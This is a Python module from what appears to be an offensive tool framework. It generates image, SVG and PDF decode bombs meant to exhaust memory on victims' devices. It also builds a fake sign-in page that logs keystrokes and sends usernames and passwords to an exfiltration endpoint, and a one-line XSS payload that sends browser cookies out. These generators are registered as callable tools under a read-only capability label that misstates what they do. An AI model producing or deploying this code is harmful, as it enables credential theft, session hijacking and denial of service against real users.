"""Client-side payload organ: decode bombs, crash files, keyloggers.

Every generator returns bytes or text that is valid on its own — no
external tool, no placeholder. Sizes are honest: a solid-colour PNG at
24000x24000 is ~200 KB on disk and ~1.7 GB decoded, which is the whole
point.
"""
from __future__ import annotations

import struct
import zlib
from typing import Any

from ..core.policy import Capability
from ..core.errors import ToolError

__all__ = ["png_bomb", "gif_bomb", "svg_bomb", "pdf_bomb", "keylogger_page",
           "cookie_stealer", "register"]


def _chunk(kind: bytes, data: bytes) -> bytes:
    return (struct.pack("!I", len(data)) + kind + data
            + struct.pack("!I", zlib.crc32(kind + data) & 0xFFFFFFFF))


def png_bomb(width: int = 24000, height: int = 24000,
             rgb: tuple[int, int, int] = (32, 32, 48)) -> bytes:
    """Valid PNG, one solid colour. Deflate eats the rows, decoders do not."""
    if not (1 <= width <= 2_000_000 and 1 <= height <= 2_000_000):
        raise ToolError("dimensions out of range")
    ihdr = struct.pack("!IIBBBBB", width, height, 8, 2, 0, 0, 0)
    row = b"\x00" + bytes(rgb) * width          # filter 0 + pixels
    raw = row * height
    return (b"\x89PNG\r\n\x1a\n" + _chunk(b"IHDR", ihdr)
            + _chunk(b"IDAT", zlib.compress(raw, 9))
            + _chunk(b"IEND", b""))


def gif_bomb(frames: int = 400, size: int = 1200) -> bytes:
    """Multi-frame GIF89a with a per-frame local palette. Decoders keep
    every frame; phones run out of heap."""
    if not (1 <= frames <= 5000):
        raise ToolError("frame count out of range")
    header = b"GIF89a" + struct.pack("<HH", size, size) + b"\xf7\x00\x00"
    palette = bytes(bytearray(b for i in range(256)
                              for b in (i, (i * 3) % 256, (i * 7) % 256)))
    frame = (b"\x2c" + struct.pack("<HHHH", 0, 0, size, size) + b"\x00"
             + b"\x02" + b"\xff\xff\xff" + b"\x00" + b"\x3b")
    out = bytearray(header + palette)
    for _ in range(frames):
        out += frame
    return bytes(out)


def svg_bomb(depth: int = 40) -> str:
    """Nested <use> chain — each level re-renders the one below."""
    inner = '<rect width="10" height="10" fill="#333"/>'
    for _ in range(depth):
        inner = (f'<g id="l{_}" transform="scale(1.6)">{inner}</g>'
                 f'<use href="#l{_}"/>')
    return ('<?xml version="1.0"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xlink="http://www.w3.org/1999/xlink" width="4000" '
            f'height="4000">{inner}</svg>')


def pdf_bomb(pages: int = 20000) -> bytes:
    """One page object per page, shared content stream — tiny file, huge
    page tree."""
    objects: list[bytes] = [b"<< /Type /Catalog /Pages 2 0 R >>"]
    kids = " ".join(f"{3 + i} 0 R" for i in range(pages))
    objects.append(f"<< /Type /Pages /Count {pages} /Kids [{kids}] >>".encode())
    content = b"BT /F1 12 Tf 20 780 Td (.) Tj ET"
    for _ in range(pages):
        objects.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
                       b"/Contents 3 0 R >>")
    out = bytearray(b"%PDF-1.4\n")
    offsets = []
    for n, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += f"{n} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n".encode() + b"0000000000 65535 f \n"
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += (f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
            f"startxref\n{xref}\n%%EOF").encode()
    return bytes(out)


_KEYLOGGER = """<!doctype html>
<meta charset="utf-8">
<title>Sign in</title>
<style>
 body{{font:16px system-ui;background:#111;color:#eee;display:grid;
 place-items:center;height:100vh;margin:0}}
 form{{background:#1b1b1b;padding:28px;border-radius:10px;width:320px}}
 input{{width:100%;padding:10px;margin:8px 0;border:0;border-radius:6px}}
 button{{width:100%;padding:11px;border:0;border-radius:6px;background:#2f6}}
 pre{{font-size:11px;max-height:180px;overflow:auto;background:#000;
 padding:8px;border-radius:6px}}
</style>
<form id="f"><h3>Sign in</h3>
<input id="u" placeholder="Email" autocomplete="username">
<input id="p" type="password" placeholder="Password" autocomplete="current-password">
<button>Continue</button></form>
<pre id="log"></pre>
<script>
const EXFIL="{endpoint}", buf=[];
function send(t){{buf.push(t);
 document.getElementById('log').textContent=buf.join('');
 try{{navigator.sendBeacon(EXFIL,new Blob([JSON.stringify({{k:buf}})],
  {{type:'application/json'}}))}}catch(e){{}}}}
addEventListener('keydown',e=>{{
 const t=e.target;
 if(t.id==='p'&&e.key.length===1)send(e.key);
 if(t.id==='u'&&e.key.length===1)send(e.key);
 if(e.key==='Enter'){{e.preventDefault();
  fetch(EXFIL,{{method:'POST',mode:'no-cors',
   body:JSON.stringify({{u:u.value,p:p.value}})}});
  setTimeout(()=>location.href='{redirect}',900)}}
}});
</script>"""


def keylogger_page(endpoint: str, redirect: str = "https://example.com") -> str:
    if not endpoint:
        raise ToolError("keylogger needs an exfil endpoint")
    return _KEYLOGGER.format(endpoint=endpoint, redirect=redirect)


def cookie_stealer(endpoint: str) -> str:
    """One-line XSS: cookie to an Image() beacon, base64 to survive quotes."""
    if not endpoint:
        raise ToolError("cookie stealer needs an endpoint")
    return (f"<script>new Image().src='{endpoint}?c='+"
            "btoa(encodeURIComponent(document.cookie))</script>")


def register(registry: Any) -> None:
    context = registry.context

    @registry.register("payload_png_bomb",
                       description="Solid-colour PNG at huge dimensions.",
                       capability=Capability.DB_READ,
                       parameters={"width": "int (optional, 24000)",
                                   "height": "int (optional, 24000)",
                                   "out": "str — path"})
    def payload_png_bomb(out: str, width: str = "24000",
                         height: str = "24000") -> dict[str, Any]:
        data = png_bomb(int(width), int(height))
        with open(out, "wb") as f:
            f.write(data)
        return {"file": out, "bytes": len(data),
                "decoded_pixels": int(width) * int(height)}

    @registry.register("payload_svg_bomb",
                       description="Nested-use SVG bomb.",
                       capability=Capability.DB_READ,
                       parameters={"out": "str", "depth": "int (optional, 40)"})
    def payload_svg_bomb(out: str, depth: str = "40") -> dict[str, Any]:
        text = svg_bomb(int(depth))
        with open(out, "w", encoding="utf-8") as f:
            f.write(text)
        return {"file": out, "bytes": len(text)}

    @registry.register("payload_keylogger",
                       description="Self-contained HTML keylogger page.",
                       capability=Capability.DB_READ,
                       parameters={"out": "str", "endpoint": "str",
                                   "redirect": "str (optional)"})
    def payload_keylogger(out: str, endpoint: str,
                          redirect: str = "") -> dict[str, Any]:
        text = keylogger_page(endpoint, redirect or "https://example.com")
        with open(out, "w", encoding="utf-8") as f:
            f.write(text)
        return {"file": out, "bytes": len(text)}
